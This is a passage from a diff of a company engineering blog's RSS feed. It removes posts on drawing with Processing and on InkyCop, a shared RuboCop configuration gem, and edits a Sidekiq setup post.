-&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;randomGreen&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
-  &lt;span class=&quot;n&quot;&gt;fill&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;random&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;255&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
-
-
-&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;randomBlue&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
-  &lt;span class=&quot;n&quot;&gt;fill&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;random&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;255&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;));&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-&lt;div class=&quot;flex-center&quot;&gt;
-  &lt;img class=&quot;tb-Img tb-Img--responsive tb-Img--fancy&quot; src=&quot;https://media.giphy.com/media/XfVh38MH47VNYUuEBW/giphy.gif&quot;&gt;
-&lt;/div&gt;
-
-&lt;p&gt;Cool, the blockiness is getting a little old. Let’s change the shape that we are drawing to a line, in addition to changing the shape we will need to the &lt;code&gt;fill&lt;/code&gt; to a &lt;code&gt;stroke&lt;/code&gt; because we are using a &lt;code&gt;line&lt;/code&gt;.&lt;/p&gt;
-&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-java&quot; data-lang=&quot;java&quot;&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;draw&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
-   &lt;span class=&quot;n&quot;&gt;randomColor&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
-   &lt;span class=&quot;n&quot;&gt;line&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mouseX&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mouseY&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;30&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
-
-
-&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;randomGreen&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
-  &lt;span class=&quot;n&quot;&gt;stroke&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;random&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;255&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
-
-&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;randomRed&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
-  &lt;span class=&quot;n&quot;&gt;stroke&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;random&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;255&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
-
-&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;randomBlue&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
-  &lt;span class=&quot;n&quot;&gt;stroke&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;random&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;255&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;));&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-&lt;div class=&quot;flex-center&quot;&gt;
-  &lt;img class=&quot;tb-Img tb-Img--responsive tb-Img--fancy&quot; src=&quot;https://media.giphy.com/media/Z9VtaLNSOyoFJ19hse/giphy.gif&quot;&gt;
-&lt;/div&gt;
-
-&lt;p&gt;Cool, if we add a little bit more code we can change the line stroke to only run when we click on the canvas instead of when we just move the mouse.&lt;/p&gt;
-&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-java&quot; data-lang=&quot;java&quot;&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;draw&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
-   &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mousePressed&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;line&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mouseX&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mouseY&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;random&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;800&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;random&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;600&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;));&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-&lt;div class=&quot;flex-center&quot;&gt;
-  &lt;img class=&quot;tb-Img tb-Img--responsive tb-Img--fancy&quot; src=&quot;https://media.giphy.com/media/ZAwycwoXLYLhmbLm5r/giphy.gif&quot;&gt;
-&lt;/div&gt;
-
-&lt;p&gt;Let’s try one more change, we’ll set the background to black on start and we’ll set the color to white for the lines and we’ll erase the lines before we make them.&lt;/p&gt;
-&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-java&quot; data-lang=&quot;java&quot;&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;setup&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
-  &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;800&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;600&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
-  &lt;span class=&quot;n&quot;&gt;background&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
-
-&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;draw&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
-  &lt;span class=&quot;n&quot;&gt;stroke&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;255&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;255&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;255&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
-  &lt;span class=&quot;n&quot;&gt;background&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
-  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mousePressed&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;line&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mouseX&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mouseY&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;random&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;800&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;random&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;600&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;));&lt;/span&gt;
-  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mousePressed&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;line&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mouseX&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mouseY&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;random&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;800&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;random&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;600&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;));&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-&lt;!-- &lt;div class=&quot;flex-center&quot;&gt; --&gt;
-
-&lt;p&gt;&lt;img class=&quot;center-img&quot; src=&quot;https://media.giphy.com/media/Rj0IVr10p2hMHBYXW1/giphy.gif&quot;&lt;/img&gt;&lt;/p&gt;
-
-&lt;!-- &lt;/div&gt; --&gt;
-
-&lt;h2 id=&quot;closing&quot;&gt;Closing&lt;/h2&gt;
-
-&lt;p&gt;I hoped this sparked some curiosity into Processing and maybe gives some ideas about what you can do with it. There is actually a lot of other cool things that people have done with Processing that are far more impressive, if your interested check out some of the links below.&lt;/p&gt;
-
-&lt;h2 id=&quot;resources-references&quot;&gt;Resources &amp;amp; References&lt;/h2&gt;
-
-&lt;h4 id=&quot;processing-youtube-videos&quot;&gt;Processing Youtube Videos&lt;/h4&gt;
-
-&lt;ul&gt;
-&lt;li&gt;&lt;a href=&quot;https://www.youtube.com/watch?v=LaarVR1AOvs&quot;&gt;https://www.youtube.com/watch?v=LaarVR1AOvs&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;https://www.youtube.com/watch?v=NTXkmpfTklQ&amp;list=PLoDuOn9IEvFfNoeh372H1Xlu7NjD12sCw&quot;&gt;https://www.youtube.com/watch?v=NTXkmpfTklQ&amp;amp;list=PLoDuOn9IEvFfNoeh372H1Xlu7NjD12sCw&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h4 id=&quot;processing-tutorials&quot;&gt;Processing Tutorials&lt;/h4&gt;
-
-&lt;ul&gt;
-&lt;li&gt;&lt;a href=&quot;https://processing.org/tutorials/&quot;&gt;https://processing.org/tutorials/&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h4 id=&quot;processing-exhibitions&quot;&gt;Processing Exhibitions&lt;/h4&gt;
-
-&lt;ul&gt;
-&lt;li&gt;&lt;a href=&quot;https://processing.org/exhibition/&quot;&gt;https://processing.org/exhibition/&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h4 id=&quot;processing-api-reference&quot;&gt;Processing API Reference&lt;/h4&gt;
-
-&lt;ul&gt;
-&lt;li&gt; &lt;a href=&quot;https://processing.org/reference/&quot;&gt;https://processing.org/reference/&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h4 id=&quot;processing-forum&quot;&gt;Processing Forum&lt;/h4&gt;
-
-&lt;ul&gt;
-&lt;li&gt;&lt;a href=&quot;https://discourse.processing.org/&quot;&gt;https://discourse.processing.org/&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-</description>
-        <pubDate>Tue, 23 Jul 2019 00:00:00 -0400</pubDate>
-        <link>https://technology.customink.com//blog/2019/07/23/lets-get-visual-with-processing/</link>
-        <guid isPermaLink="true">http://technology.customink.com//blog/2019/07/23/lets-get-visual-with-processing/</guid>
-      </item>
-    
-      <item>
-        <title>Inkycop - Standardizing team configuration for RuboCop</title>
-        <description>&lt;p&gt;How Custom Ink unifies its code base across projects.&lt;/p&gt;
-
-&lt;!--more--&gt;
-
-&lt;h3 id=&quot;ruby-coding-guide&quot;&gt;Ruby Coding Guide&lt;/h3&gt;
-
-&lt;p&gt;I&amp;#39;m sure that every developer is familiar with the concept of a coding guide to ensure that everyone working on a project is writing the same code.
-This ensures that the code style remains consistent, and the overall quality of the code is guaranteed.
-Of course this doesn&amp;#39;t come without its share of problems and difficulties.&lt;/p&gt;
-
-&lt;p&gt;As it stands right now, Custom Ink has just over 800 different repositories on GitHub, the majority of them being Ruby projects.
-As we have multiple teams working across these projects, we need to come up with some way to keep a uniform code style.&lt;/p&gt;
-
-&lt;h3 id=&quot;rubocop&quot;&gt;RuboCop&lt;/h3&gt;
-
-&lt;p&gt;Almost all of our Ruby projects use &lt;a href=&quot;https://rubocop.readthedocs.io/en/stable/&quot;&gt;RuboCop&lt;/a&gt; through CodeClimate. 
-While this is a good step in the right direction, it does not guarantee that all projects also adhere to the same style guidelines.
-After all, nothing prevents an engineer from disabling a rule, changing its configuration or outright ignoring the messages from CodeClimate.&lt;/p&gt;
-
-&lt;h3 id=&quot;codeclimate&quot;&gt;CodeClimate&lt;/h3&gt;
-
-&lt;p&gt;As mentioned above, we use &lt;a href=&quot;https://codeclimate.com/&quot;&gt;CodeClimate&lt;/a&gt;. 
-We, however, do not always see eye-to-eye with the warnings and issues raised by CodeClimate.
-Mainly because a team might have a different view on things, there&amp;#39;s a reason why we want to deviate or something is technically not possible.
-There are also technical limitations imposed by CodeClimate that make it hard to do certain technical solutions.&lt;/p&gt;
-
-&lt;h3 id=&quot;meet-inkycop&quot;&gt;Meet InkyCop!&lt;/h3&gt;
-
-&lt;p&gt;Inky is the mascot of Custom Ink. Our lovely octopus is a part of the company, and seeing we actually depend on RuboCop, I came up with the name InkyCop.
-So what is InkyCop exactly?&lt;/p&gt;
-
-&lt;p&gt;InkyCop is a gem developed for internal usage at the moment, where we have created several configuration files:&lt;/p&gt;
-
-&lt;ul&gt;
-&lt;li&gt;a special &lt;code&gt;customink.yml&lt;/code&gt; file that contains the general configuration for all RuboCop cops, regardless of Ruby version&lt;/li&gt;
-&lt;li&gt;a special folder structure to support ruby-specific &lt;code&gt;rubocop.yml&lt;/code&gt; versions for that Ruby version&lt;/li&gt;
-&lt;li&gt;a special folder structure to support RuboCop-plugins such as &lt;code&gt;rubocop-rails&lt;/code&gt; and &lt;code&gt;rubocop-rspec&lt;/code&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;This allows us to create a matrix of configurations that we can tweak to support all Ruby versions that are supported by RuboCop, and used inside the company.
-Of course, we need to work on getting everything up to date, but this is a tremendous amount of work that will take time, and it&amp;#39;s easier to support the version through RuboCop.&lt;/p&gt;
-
-&lt;p&gt;Our merchandising system is actually the first system to rely on InkyCop!
-Its configuration file looks as follows:&lt;/p&gt;
-&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-yaml&quot; data-lang=&quot;yaml&quot;&gt;&lt;span class=&quot;c1&quot;&gt;# The load order is first those defined by inkycop, then everything in the todo file,&lt;/span&gt;
-&lt;span class=&quot;c1&quot;&gt;# finally whatever is appended later in this file.&lt;/span&gt;
-&lt;span class=&quot;na&quot;&gt;inherit_from&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;.rubocop_todo.yml&lt;/span&gt;
-
-&lt;span class=&quot;na&quot;&gt;inherit_gem&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
-  &lt;span class=&quot;na&quot;&gt;inkycop&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
-    &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;config/rspec/2.3/rubocop.yml&lt;/span&gt;
-    &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;config/customink.yml&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-&lt;p&gt;That&amp;#39;s it! nothing more needs to be added or configured to use all of RuboCop features, and rely on the shared configuration that&amp;#39;s defined in our Gem.&lt;/p&gt;
-
-&lt;h3 id=&quot;issues-we-ran-into&quot;&gt;Issues we ran into&lt;/h3&gt;
-
-&lt;p&gt;Getting InkyCop successfully integrated was no easy-feat. There&amp;#39;s actually quite a few technical details that need to be kept in mind when creating this gem.
-Even though the gem in itself is nothing more than a simple wrapper around RuboCop with custom configuration files:&lt;/p&gt;
-
-&lt;ul&gt;
-&lt;li&gt;CodeClimate does not work for InkyCop. CodeClimate does not allow the usage of external gems during their RuboCop engine. This results in their engine crashing because the &lt;code&gt;inkycop&lt;/code&gt; gem is not checked out.&lt;/li&gt;
-&lt;li&gt;To work around this problem, we actually switched to CircleCI (for other reasons) and made the RuboCop check a part of the CI.&lt;/li&gt;
-&lt;li&gt;A build is now considered a failure if the RuboCop check does not pass.&lt;/li&gt;
-&lt;li&gt;RuboCop must be executed using &lt;code&gt;bundle exec&lt;/code&gt; or with a binstub.&lt;/li&gt;
-&lt;li&gt;The naming of the configuration files was important! Note that we called our files &lt;code&gt;rubocop.yml&lt;/code&gt; and not &lt;code&gt;.rubocop.yml&lt;/code&gt; inside the gem.&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h4 id=&quot;rubocop-file-names&quot;&gt;RuboCop file names&lt;/h4&gt;
-
-&lt;p&gt;There is a subtle difference on how RuboCop interprets paths, depending on how your configuration files are named.
-This took some debugging as well as diving deep into the documentation of RuboCop to understand and figure out.&lt;/p&gt;
-
-&lt;ul&gt;
-&lt;li&gt;&lt;code&gt;.rubocop.yml&lt;/code&gt; : All paths are treated as relative of the file&amp;#39;s location&lt;/li&gt;
-&lt;li&gt;&lt;code&gt;rubocop.yml&lt;/code&gt; : All paths are treated as relative of the location RuboCop is running from&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;While this seemed to work properly at first, it becomes more tricky when files start inheriting from one another and/or files are combined as we do.
-That&amp;#39;s why we made this an integral part of our documentation to make sure this information is well known.&lt;/p&gt;
-
-&lt;h3 id=&quot;upcoming-challenges&quot;&gt;Upcoming challenges&lt;/h3&gt;
-
-&lt;p&gt;The next step is get all projects to migrate slowly to using InkyCop, so we can start tweaking our configuration.
-There&amp;#39;s going to be a lot of discussion on whether we will follow the standard set by RuboCop, or tweak a Cop to our liking.
-In the end, all teams will have to agree to it, and roll out with InkyCop to unify the coding guidelines across the entire code-base.&lt;/p&gt;
-</description>
-        <pubDate>Mon, 15 Jul 2019 00:00:00 -0400</pubDate>
-        <link>https://technology.customink.com//blog/2019/07/15/inkycop/</link>
-        <guid isPermaLink="true">http://technology.customink.com//blog/2019/07/15/inkycop/</guid>
+        <pubDate>Wed, 10 Jul 2019 00:00:00 -0400</pubDate>
+        <link>https://technology.customink.com//blog/2019/07/10/authorization-with-api-gateway-and-congito/</link>
+        <guid isPermaLink="true">http://technology.customink.com//blog/2019/07/10/authorization-with-api-gateway-and-congito/</guid>
       </item>
     
       <item>
@@ -635,14 +94,14 @@ In the end, all teams will have to agree to it, and roll out with InkyCop to uni
 
 &lt;h5 id=&quot;sidekiq-architecture&quot;&gt;Sidekiq Architecture&lt;/h5&gt;
 
-&lt;p&gt;&lt;img src=/assets/content/sidekiq/sidekiq-architecture-55a7b0491a724dd5c4b39570ea60966d438f97bebc2e9562ab5881db319fdc0f.png alt=&quot;sidekiq-architecture&quot; class=&quot;tb-Img tb-Img--responsive tb-Img--fancy&quot;/&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=/assets/content/sidekiq/sidekiq-architecture-efeb945774bf1dbcd2ec31aa8d9a7a28f01a87be6197067b9e7b736a6065844f.png alt=&quot;sidekiq-architecture&quot; class=&quot;tb-Img tb-Img--responsive tb-Img--fancy&quot;/&gt;&lt;/p&gt;
 
 &lt;p&gt;Sidekiq runs on 3 components&lt;/p&gt;
 
 &lt;ul&gt;
 &lt;li&gt;The Rails Application&lt;/li&gt;
 &lt;li&gt;Sidekiq worker process(es)&lt;/li&gt;
-&lt;li&gt;Redis&lt;/li&gt;
+&lt;li&gt;Redis cache&lt;/li&gt;
 &lt;/ul&gt;
 
 &lt;p&gt;Each of these components can be scaled up to meet the needs of your workflows.&lt;/p&gt;
@@ -662,15 +121,15 @@ In the end, all teams will have to agree to it, and roll out with InkyCop to uni
 &lt;p&gt;The sidekiq code that lives in the application will need to be configured to talk to Redis.&lt;/p&gt;
 
 &lt;p&gt;Inside of &lt;code&gt;config/initializers/sidekiq.rb&lt;/code&gt;&lt;/p&gt;
-&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;&lt;span class=&quot;c1&quot;&gt;# Server config&lt;/span&gt;
-&lt;span class=&quot;no&quot;&gt;Sidekiq&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;configure_server&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;config&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
-  &lt;span class=&quot;n&quot;&gt;config&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;redis&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;namespace: &lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'blog-post-app'&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-&quot; data-lang=&quot;&quot;&gt;# Server config
+Sidekiq.configure_server do |config|
+  config.redis = { namespace: 'blog-post-app' }
+end
 
-&lt;span class=&quot;c1&quot;&gt;# Client config&lt;/span&gt;
-&lt;span class=&quot;no&quot;&gt;Sidekiq&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;configure_client&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;config&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
-  &lt;span class=&quot;n&quot;&gt;config&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;redis&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;namespace: &lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'blog-post-app'&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
+# Client config
+Sidekiq.configure_client do |config|
+  config.redis = { namespace: 'blog-post-app' }
+end
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 &lt;h5 id=&quot;sidekiq-workers&quot;&gt;Sidekiq Workers&lt;/h5&gt;
 
@@ -678,12 +137,12 @@ In the end, all teams will have to agree to it, and roll out with InkyCop to uni
 
 &lt;p&gt;Create a worker in &lt;code&gt;app/workers&lt;/code&gt; with
 &lt;code&gt;rails g sidekiq:worker BlogPost&lt;/code&gt;&lt;/p&gt;
-&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;BlogPostWorker&lt;/span&gt;
-  &lt;span class=&quot;kp&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Sidekiq&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;Worker&lt;/span&gt;
